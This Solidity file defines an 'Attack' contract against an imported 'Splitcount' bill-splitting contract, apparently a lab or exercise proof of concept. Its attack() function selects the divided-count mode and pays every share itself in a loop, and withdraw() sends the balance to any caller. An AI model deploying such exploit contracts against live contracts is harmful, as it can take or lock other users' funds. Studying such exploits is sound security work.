// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Splitcount.sol";


contract Attack {

    Splitcount public sc;
    uint bill;
    uint payers;

    constructor(address payable addr, uint _bill, uint _payers) public payable {
        require(msg.value >= _bill, "You need to pay the count, you will be able to withdraw remaining amount!");
        sc = Splitcount(addr);
        bill = _bill;
        payers = _payers;
    }

    function attack() public {
        sc.selectDividedCount();
        
        uint minPay;
        for (uint i = 0; i < payers; i++) {
            minPay = (bill / payers);
            sc.pay{value: minPay}();
            bill -= minPay;
        }
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }   

    function deposit() public payable {}  

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external  payable{
    }
}